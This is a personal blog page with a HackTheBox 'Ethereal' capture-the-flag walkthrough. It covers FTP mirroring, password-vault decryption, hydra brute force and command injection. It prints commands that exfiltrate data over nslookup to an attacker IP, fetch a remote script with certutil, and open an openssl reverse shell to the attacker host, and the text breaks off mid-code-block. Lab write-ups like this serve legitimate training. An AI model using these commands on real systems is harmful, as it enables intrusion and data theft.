<!DOCTYPE html>
<html>
  <head>
    <title>Pwny_Sec</title>
    
      <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="revised" content="2019-07-13T20:58:08 EDT">
<title>Ethereal :: Pwny_Sec</title>
<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
<link href="/css/font-awesome.min.css" rel="stylesheet">
<link href="/css/nucleus.css" rel="stylesheet">
<link href="/theme-flex/style.css" rel="stylesheet">

	<link href="/theme-flex/variant-red.css" rel="stylesheet">

<link rel="stylesheet" href="/css/bootstrap.min.css">
<script src="/js/jquery-2.x.min.js"></script>
<script type="text/javascript">
      var baseurl = "\/";
</script>
<meta name="description" content="">



    
  </head>
  <body data-url="/hackthebox/boxes/ethereal/">
    
      <header>
  <div class="logo">
    




<h2 id="pwny-sec">Pwny_Sec</h2>




  </div>
  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
    <nav class="shortcuts">
            <li class="" role="">
                <a href="https://twitter.com/pwny_sec"  rel="noopener">
                  <i class='fa fa-twitter'></i> <label>Twitter</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
                  <i class='fa fa-github'></i> <label>Github repo</label>
                </a>
            </li>
            <li class="" role="">
                <a href="https://chickenpwny.github.io/images/meme/raw.gif"  rel="noopener">
                  <i class='fa fa-cloud-download'></i> <label>Download</label>
                </a>
            </li>
            <li class="" role="">
                <a href="#"  rel="noopener">
                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
                </a>
            </li>
            <li class="" role="">
                <a href="/credits"  rel="noopener">
                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
                </a>
            </li>
    </nav>
</header>
<article>
  <aside>
    <ul class="menu">
<a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
<li data-nav-id="/concepts/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/dll/" class="dd-item">
    <div>
        <a href="/concepts/dll/">
            DLL-Hijacking
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/file-transfer/" class="dd-item">
    <div>
        <a href="/concepts/file-transfer/">
            File Transfer
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/linux_enum/" class="dd-item">
    <div>
        <a href="/concepts/linux_enum/">
            Linux Enumeration
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
        ">
    <div>

        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
        ">
    <div>

        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/concepts/bypass/" class="dd-item">
    <div>
        <a href="/concepts/bypass/">
            Windows-Bypass
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/concepts/windows_enum/" class="dd-item">
    <div>
        <a href="/concepts/windows_enum/">
            Windows_enum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/">HackTheBox</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
        ">
    <div>

        <a href="/hackthebox/boxes/">Boxes</a>
        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/chaos-og/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/chaos-og/">
            CHAOS
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/inusectf/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/inusectf/">
            CTF
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier/">
            Carrier
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/carrier-root/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/carrier-root/">
            CarrierRoot
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/devel/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/devel/">
            Devel
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/ethereal/" class="dd-item active">
    <div>
        <a href="/hackthebox/boxes/ethereal/">
            Ethereal
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/flujab/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/flujab/">
            Flujab
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/friendzone/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/friendzone/">
            FriendZone
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/grand-pa/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/grand-pa/">
            GrandMa
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/legacy/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/legacy/">Legacy</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/lightweight/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/lightweight/">
            LightWeight
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/optimum/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/optimum/">
            Optimum
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/sizzle/">
            Sizzle
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/gold-sizzle/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/gold-sizzle/">
            Sizzle-Gold
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/vault/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/vault/">
            Vault
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/zipper/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/zipper/">Zipper</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/oz/">oz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
        ">
    <div>

        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/hackthebox/boxes/teacher/" class="dd-item">
    <div>
        <a href="/hackthebox/boxes/teacher/">
            teacher
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/github/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/github/hugopowershell/" class="dd-item">
    <div>
        <a href="/hackthebox/github/hugopowershell/">
            Hugo/Github/Power
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
        ">
    <div>

        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
    <div>
        <a href="/hackthebox/challenges/bloodhound/">
            
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>
<li data-nav-id="/help/" class="dd-item
        ">
    <div>

        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/bloodhound/" class="dd-item">
    <div>
        <a href="/tools/bloodhound/">
            BloodHound Neo4j
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ftp/" class="dd-item">
    <div>
        <a href="/tools/ftp/">
            FTP
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/hydra/" class="dd-item
        ">
    <div>

        <a href="/tools/hydra/">Hydra</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/nmap/" class="dd-item">
    <div>
        <a href="/tools/nmap/">
            Nmap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
        ">
    <div>

        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/smb/smb/" class="dd-item">
    <div>
        <a href="/tools/smb/smb/">
            SMB
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/snmpwalk/" class="dd-item
        ">
    <div>

        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/webapp/burp/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/skipfish/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/skipfish/">SkipFish</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
    <div>
        <a href="/tools/webapp/sqlmap/sqlmap/">
            SqlMap
        </a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
        ">
    <div>

        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
<li data-nav-id="/tools/ssh/" class="dd-item haschildren
        ">
    <div>

        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
    </div>
    <ul>
<li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/port-forwarding/">SHH Port Forwarding</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
        ">
    <div>

        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
    </div>
</li>
    </ul>
</li>
    </ul>
</li>



    </ul>
    <section>
    </section>
  </aside>
  <section class="page">
    
    <div class="nav-select">
      <center>Navigation : 
        <select onchange="javascript:location.href = this.value;">
          
    <option value="/concepts/" >
   Concept</option>
    <option value="/hackthebox/" >
   HackTheBox</option> 
    <option value="/hackthebox/boxes/" >
  - 
   Boxes</option> 
    <option value="/hackthebox/boxes/hawk/" >
  -- 
   </option>
    <option value="/hackthebox/boxes/blue/" >
  -- 
   Blue</option>
      <option value="/hackthebox/boxes/chaos-og/" >-- CHAOS</option>
      <option value="/hackthebox/boxes/inusectf/" >-- CTF</option>
      <option value="/hackthebox/boxes/carrier/" >-- Carrier</option>
      <option value="/hackthebox/boxes/carrier-root/" >-- CarrierRoot</option>
    <option value="/hackthebox/boxes/crimestoppers/" >
  -- 
   CrimeStopper</option>
      <option value="/hackthebox/boxes/devel/" >-- Devel</option>
      <option value="/hackthebox/boxes/ethereal/"  selected>-- Ethereal</option>
      <option value="/hackthebox/boxes/flujab/" >-- Flujab</option>
      <option value="/hackthebox/boxes/friendzone/" >-- FriendZone</option>
      <option value="/hackthebox/boxes/grand-pa/" >-- GrandMa</option>
    <option value="/hackthebox/boxes/legacy/" >
  -- 
   Legacy</option>
      <option value="/hackthebox/boxes/lightweight/" >-- LightWeight</option>
    <option value="/hackthebox/boxes/mischief/" >
  -- 
   Mischief</option>
      <option value="/hackthebox/boxes/optimum/" >-- Optimum</option>
    <option value="/hackthebox/boxes/poison/" >
  -- 
   Poison</option>
    <option value="/hackthebox/boxes/secnotes/" >
  -- 
   SecNotes</option>
      <option value="/hackthebox/boxes/sizzle/" >-- Sizzle</option>
      <option value="/hackthebox/boxes/gold-sizzle/" >-- Sizzle-Gold</option>
    <option value="/hackthebox/boxes/valentine/" >
  -- 
   Valentine</option>
      <option value="/hackthebox/boxes/vault/" >-- Vault</option>
    <option value="/hackthebox/boxes/waldo/" >
  -- 
   Waldo</option>
    <option value="/hackthebox/boxes/zipper/" >
  -- 
   Zipper</option>
    <option value="/hackthebox/boxes/oz/" >
  -- 
   oz</option>
    <option value="/hackthebox/boxes/sunday/" >
  -- 
   sunday</option>
      <option value="/hackthebox/boxes/teacher/" >-- teacher</option>
  
    <option value="/hackthebox/github/" >
  - 
   GitHub</option>
    <option value="/hackthebox/challenges/" >
  - 
   Miscellaneous</option>
  
    <option value="/help/" >
   Network Manager Down</option>
    <option value="/tools/" >
   Tools</option>



        </select>
      </center>
    </div>
      <div>
        <div class="searchbox">
          <input data-search-input id="search-by" type="text" placeholder="Search...">
        </div>
        <script type="text/javascript" src="/js/lunr.min.js"></script>
        <script type="text/javascript" src="/js/auto-complete.js"></script>
        <link href="/css/auto-complete.css" rel="stylesheet">
        <script type="text/javascript">
          
              var baseurl = "\/";
          
        </script>
        <script type="text/javascript" src="/js/search.js"></script>
      </div>
    

    <h1>Ethereal</h1>
    
    
    
    

<p>there is allot going on with this box first we go to ftp but we can only interact with it using some other methods. used wget to download the drive. inside the drives we find pbox then use that to get some creds. go back to the website enter creds. play around with the waf to run cmd&rsquo;s. then have to write a python script to get a shell. it just keeps going.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/30836778b01686b4679c840cd51d79a0.gif.jpg" alt="30836778b01686b4679c840cd51d79a0.gif" /></p>

<p>nmap revealed ftp 21, Microsoft iis httpd 10.0 which is 2016 and up.</p>

<pre><code>nmap -sC -sV -T4 -Pn -oA tcp-connect 10.10.10.106
Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-19 00:05 EDT                
Nmap scan report for 10.10.10.106
Host is up (0.30s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                         
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http    Microsoft IIS httpd 10.0                                
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0                                       
|_http-title: Ethereal
8080/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                 
|_http-server-header: Microsoft-HTTPAPI/2.0                                    
|_http-title: Bad Request
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                       
</code></pre>

<p>FTP ACCESS</p>

<p>i would like to take this time and play around with the ftp service and explore different ways to access it.</p>

<pre><code>ftp://anonymous@10.10.10.1066
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/ftp-web-access.PNG" alt="ftp-web-access" /></p>

<p>using wget pretty neat trick.</p>

<pre><code>wget --no-passive-ftp -m ftp://anonymous:password@10.10.10.106
-m mirror
-c continue download
--no-passive-ftp 
</code></pre>

<p>web enumeration</p>

<p>the website has four pages that are accessible.</p>

<p>GREP - this was pretty neat it print out file&rsquo;s that match the pattern.</p>

<pre><code>grep -R password .
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/grep.PNG" alt="grep" /></p>

<p>Using the md5sum to check the bianry against virus total was fucking sweet.</p>

<pre><code>md5sum ./10.10.10.106/binaries/Orca.Msi
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/md5sum.PNG" alt="md5sum" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/virtus-total.PNG" alt="virtus-total" /></p>

<p>using some kind of command line with file to print out both files</p>

<pre><code>file *DISK{,1,2}
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/smb-meow.PNG" alt="smb-meow" /></p>

<p>so apparently you don&rsquo;t want to keep original backups or modify any of the original files. so ippsec made a new directory then copied the files over.</p>

<pre><code>find . -ls
du -hs *
md5sum *
strings *
</code></pre>

<p>so mounted the drives to /mnt/ethereal and found pbox.dat in FDISK. pbox stores the password file at /root/pbox.dat the file is password encrypted. the password is password lol, but we will cover two ways to do this. Download pbox locally from the sourceforge page . Then take the pbox.dat file from fdisk and move it over to root/.pbox.dat.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/pbox-dump.PNG" alt="pbox-dump" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/pbox.PNG" alt="pbox" /></p>

<p>ippsec made a list using vim, then used awk to print out the table/list. i suppose the colon in username:password. the -F switch is using the colon xD</p>

<pre><code>awk -F: '{print $1}' password.txt| sort -u &gt; user.txt
awk -F: '{print $2}' password.txt| sort -u &gt; pass.txt
</code></pre>

<p>after the list are made use hydra to bruteforce the webpage. ippsec use a different request method get-http</p>

<pre><code>hydra -L user.txt -P pass.txt http://ethereal.htb:8080
hydra -L user.txt -P pass.txt httt-get://ethereal.htb:8080
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/hydra.PNG" alt="hydra" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/hydra-results.PNG" alt="hydra-results" /></p>

<pre><code>user:	alan
pass:	!C414m17y57r1k3s4g41n!
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection.PNG" alt="website-8080-admin-cmd-injection" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-ping.PNG" alt="website-8080-admin-cmd-injection-ping" /></p>

<p>we can do nested commands with &amp;&amp;</p>

<p>I&rsquo;m just going to guess before i continue that this is the where the cmd injection is.</p>

<pre><code>-n 1 10.10.14.2 &amp;&amp; ping -n 1 10.10.14.2
</code></pre>

<p>next setup tcpdump</p>

<pre><code>tcpdump -i tun0 icmp
</code></pre>

<p>TCPDUMP - DNS</p>

<p>the 1 will tell you output is coming out the later will not</p>

<pre><code>tcpdump -i tun0 -vvv udp port 53
tcpdump -i tun0 -vvv dns
tcpdump -i tun0 -nnXSs 0 udp port 53 -w dns.pcap  
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection2.PNG" alt="website-8080-admin-cmd-injection2" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/wireshark.PNG" alt="wireshark" /></p>

<p>RESPONDER</p>

<p>changed cmd to dir /b which is like ls -la or list all files including hidden files.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump2.PNG" alt="responder_tcpdump2" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump.PNG" alt="responder_tcpdump" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/responder_tcpdump3.PNG" alt="responder_tcpdump3" /></p>

<p>xD viewstate.</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-encoded2.PNG" alt="website-8080-admin-cmd-injection-encoded2" /></p>

<p><img src="https://chickenpwny.github.io/images/ethereal/website-8080-admin-cmd-injection-encoded.PNG" alt="website-8080-admin-cmd-injection-encoded" /></p>

<pre><code>certutil.exe -urlcache -split -f http://10.10.14.2/Invoke-pinkie.ps1 Invoke-pinkie.ps1
</code></pre>

<p>we are skipping allot of the pain right here. there is a firewall inplace that&rsquo;s preventing connect back so it won&rsquo;t connect. we have to use dns tools to bypass the firewall restrictions.</p>

<pre><code>nslookup pinkiepie 10.10.10.106
nslookup %USERNAME% 10.10.10.106 	#whoami doenst work
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/username.PNG" alt="username" /></p>

<pre><code>for /f %a in ('cmd /c &quot;whoami&quot;') do (nslookup %a 10.10.14.2)
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/command.PNG" alt="command" /></p>

<pre><code>for /f %a in ('cmd /c &quot;whoami&quot;') do (nslookup %a 10.10.14.2)
edit do not need cmd /c
dir /b print one line at a time. 
</code></pre>

<pre><code>for /f &quot;tokens=1,2,3&quot; %a in ('dir') do (echo %a%b%c)
for /f &quot;tokens=1,2,3,4,5,6&quot; %a in ('dir') do (echo %a%b%c%d%e%f)
for /f %a in ('dir /b') do (nslookup %a 10.10.14.2)
</code></pre>

<p><img src="https://chickenpwny.github.io/images/ethereal/nslookup-ex2.PNG" alt="nslookup-ex2" /></p>

<p>so ippsec moved over to windows to do the box. he wrote a script using scapy</p>

<pre><code>cmd /c for /f %a in ('dir /b') do (echo %a)
</code></pre>

<p>so blah blah blah. now we are writing a a python script to the script so far pulls in quite the handful of python modules.I would like to cover theses a little bit because most of these are new.</p>

<p>scrapy simply put is tcpdump for python. it will allow us to interact with packets.</p>

<p>Threading i have no idea what threading module does. okay, so apparently the way python works you can&rsquo;t run different task on different processors at the same time you can but there is overhead and beyond the scope of this. what this does is give each processor a task it runs each task one at a time. but this allows it to run certain task quicker, or keep some on the backburner waiting. this doesn&rsquo;t work like you would think it does. lol</p>

<p>i have used the requests module before nothing new. the authentication aspect is kind of new.</p>

<p>Beautiful soup makes interacting with webpages easy lol will help with dealing witht he viewstates.</p>

<pre><code>__VIEWSTATE=
__VIEWSTATEGENERATOR=
__EVENTVALIDATION=3D&amp;
search=-n+1+127.0.0.1+%26%26+for+/f+%25a+in+('dir+/b')+do+(nslookup+%25a+10.10.14.2)&amp;ctl02=
</code></pre>

<p>PLAYING AROUND</p>

<p>NOTE NEED TO HAVE RESPONDER ON TO STOP THE DOUBLE SUBMITTIONS</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/doubles.PNG" alt="doubles" /></p>

<p>WINDOWS ENUMERATION</p>

<pre><code>set
whoami /all
		/priv
</code></pre>

<p>no output need to go back the script and edit args into &lsquo;cmd /c&rdquo;{args}&ldquo;&rsquo;</p>

<pre><code>netsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:
</code></pre>

<p>output</p>

<pre><code>netsh advfirewall firewall show rule name=all direction=out | findstr /c:Name:                                      
Rule Name: @{Microsoft.XboxGameCallableUI_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.XboxGameCallableUI/resources/PkgDisplayName}
Rule Name: @{Microsoft.Windows.Apprep.ChxApp_1000.14393.2339.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Apprep.ChxApp/resources/DisplayName}
Rule Name: @{Microsoft.LockApp_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.LockApp/resources/AppDisplayName}
Rule Name: @{Microsoft.AccountsControl_10.0.14393.2068_neutral__cw5n1h2txyewy?ms-resource://Microsoft.AccountsControl/Resources/DisplayName}
Rule Name: @{Microsoft.Windows.Cortana_1.7.0.14393_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.Cortana/resources/PackageDisplayName}
Rule Name: @{Microsoft.Windows.ShellExperienceHost_10.0.14393.2068_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.ShellExperienceHost/resources/PkgDisplayName}
Rule Name: @{Microsoft.Windows.CloudExperienceHost_10.0.14393.1066_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.Windows.CloudExperienceHost/resources/appDescription}
Rule Name: @{Microsoft.AAD.BrokerPlugin_1000.14393.0.0_neutral_neutral_cw5n1h2txyewy?ms-resource://Microsoft.AAD.BrokerPlugin/resources/PackageDisplayName}
Rule Name: Allow ICMP Request
Rule Name: Allow UDP Port 53
Rule Name: Allow TCP Ports 73, 136
Rule Name: Allow ICMP Reply

</code></pre>

<p>proga   #so we have 3 ports. easiest way to go into program files is progra 1 &amp; 2</p>

<pre><code>cd \
cd progra~1
dir c:\progra~2\
</code></pre>

<p>we&rsquo;re hunting for a program on the file system to use to connect back. ippsev went to lolbas-pogject.github.io which a web used in a couple of his videos and there is another web site i believe for linux. you may typican binaries and it will tell you about the binary or whatever.</p>

<p>The system has openssl we will use lolbas to figure out</p>

<p><img src="https://chickenpwny.github.io/images/ethereal/opensll.PNG" alt="opensll" /></p>

<p>make openssl cert</p>

<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre>

<p>client</p>

<pre><code>openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2]
</code></pre>

<p>server</p>

<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 73
openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1]
openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2]
</code></pre>

<p>openSSL revershell from windows client. there is a simple command we can use to if the host has the openssl bianrey.</p>

<pre><code>start cmd.exe /c 	#open a whole new terminal
</code></pre>

<p>move cursor to desirded area then do 9 + yy</p>

<pre><code>cmd c:\propra~2\openssl-v1.1.0\bin\openssl.exe s_client -connect 10.10.14.2:73
